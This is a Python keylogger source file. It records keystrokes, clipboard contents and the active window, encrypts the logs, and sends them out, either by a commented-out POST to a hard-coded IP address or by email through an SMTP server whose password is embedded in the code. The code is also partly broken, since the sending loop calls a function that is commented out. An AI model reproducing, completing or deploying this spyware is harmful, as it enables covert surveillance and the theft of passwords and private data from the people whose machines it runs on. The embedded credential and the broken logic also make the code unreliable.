from pynput.keyboard import Listener
import requests
import time
import threading
import pyperclip
import platform
import subprocess
import json
from cryptography.fernet import Fernet
import os
import base64
import smtplib
from email.message import EmailMessage

# Lists to store captured data
keystrokes = []
clipboard_data = []
active_window_info = []
last_clipboard = ""
last_window = None  # Track the last active window

# Function to get active window on macOS
def get_active_window_mac():
    try:
        result = subprocess.run(
            ["osascript", "-e", 'tell application "System Events" to get name of (processes where frontmost is true)'],
            capture_output=True, text=True
        )
        return result.stdout.strip()
    except Exception as e:
        return f"Error getting active window: {e}"

# Function to get active window on Windows
def get_active_window_windows():
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except Exception as e:
        return f"Error getting active window: {e}"

# Main function to get active window based on OS
def get_active_window():
    if platform.system() == "Windows":
        return get_active_window_windows()
    elif platform.system() == "Darwin":  # macOS
        return get_active_window_mac()
    else:
        return "Unsupported OS"

# Function to log active window only when it changes
def log_active_window():
    global last_window, active_window_info
    active_window = get_active_window()
    if active_window != last_window:
        last_window = active_window
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        active_window_info.append({"timestamp": timestamp, "window": active_window})

# Function to capture keystrokes
def on_press(key):
    global keystrokes
    try:
        keystrokes.append(f"{key.char}")
    except AttributeError:
        keystrokes.append(f"{key}")

    # Log the active window only when it changes
    log_active_window()

# Function to capture clipboard content
def log_clipboard():
    global clipboard_data, last_clipboard
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content and clipboard_content.strip() != "" and clipboard_content != last_clipboard:
            clipboard_data.append(clipboard_content)
            last_clipboard = clipboard_content

            # Log the active window only when it changes
            log_active_window()
    except Exception as e:
        print(f"Clipboard logging error: {e}")

# Load or generate the encryption key
def load_key():
    # File path for the key
    key_path = "hidden.key"

    # Check if the key file exists
    if not os.path.exists(key_path):
        # Generate a new key and save it if the file doesn't exist
        key = Fernet.generate_key()
        with open(key_path, "wb") as key_file:
            key_file.write(key)
        print("Encryption key generated and saved to hidden.key")
    else:
        # Load the existing key
        with open(key_path, "rb") as key_file:
            key = key_file.read()
        print("Encryption key loaded from hidden.key")

    return key

# Initialize the cipher with the loaded key
key = load_key()
cipher = Fernet(key)

# Encrypt data and encode in Base64 for safe transmission
def encrypt_data(data):
    json_data = json.dumps(data)  # Convert data to JSON string
    encrypted_data = cipher.encrypt(json_data.encode())  # Encrypt JSON string
    # Encode encrypted data as Base64 string for transmission
    encoded_data = base64.b64encode(encrypted_data).decode()
    return encoded_data

# Function to send data to the web server with formatted JSON
# def send_data():
#     global keystrokes, clipboard_data, active_window_info
#     url = "http://100.95.250.255:5000/receive-data"

#     # Create data payload
#     data = {
#         "keystrokes": keystrokes,
#         "clipboard": clipboard_data,
#         "active_window": active_window_info,
#         "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
#     }

#     # Encrypt and encode data in Base64
#     encrypted_data = encrypt_data(data)

#     # Send as JSON to the server
#     payload = {"encrypted_data": encrypted_data}  # Wrap in a dictionary for JSON format

#     try:
#         response = requests.post(url, json=payload)  # Send as JSON
#         if response.status_code == 200:
#             print("Data sent successfully")
#             # Clear local data after successful send
#             keystrokes = []
#             clipboard_data = []
#             active_window_info = []
#         else:
#             print(f"Failed to send data")
#     except Exception as e:
#         print(f"Failed to send data: {e}")

def send_email():
    sender_email = "hello@demomailtrap.com"
    receiver_email = "geniusmyra@gmail.com"
    subject = "Keylogger Data"

    # Load the log data
    try:
        with open("received_data.txt", "r") as file:
            log_data = file.read()
    except FileNotFoundError:
        print("Log file not found.")
        return

    # Create an email message
    message = EmailMessage()
    message.set_content(log_data)
    message['Subject'] = subject
    message['From'] = sender_email
    message['To'] = receiver_email

    # SMTP server details
    smtp_server = "live.smtp.mailtrap.io"
    smtp_port = 587
    smtp_username = "api"
    smtp_password = "135c408123864db529258d292639635a"

    # Send the email
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_username, smtp_password)
            server.send_message(message)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Continuous monitoring for clipboard changes
def monitor_clipboard():
    while True:
        log_clipboard()
        time.sleep(5)  # Check clipboard every 5 seconds

# Periodic data sending loop
def sending_loop():
    while True:
        time.sleep(60)  # Send data every 60 seconds
        send_data()

# Start keylogger and monitoring in parallel threads
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Run keylogger, clipboard monitoring, and data sending in separate threads
keylogger_thread = threading.Thread(target=start_keylogger)
clipboard_thread = threading.Thread(target=monitor_clipboard)
sending_thread = threading.Thread(target=sending_loop)

keylogger_thread.start()
clipboard_thread.start()
sending_thread.start()
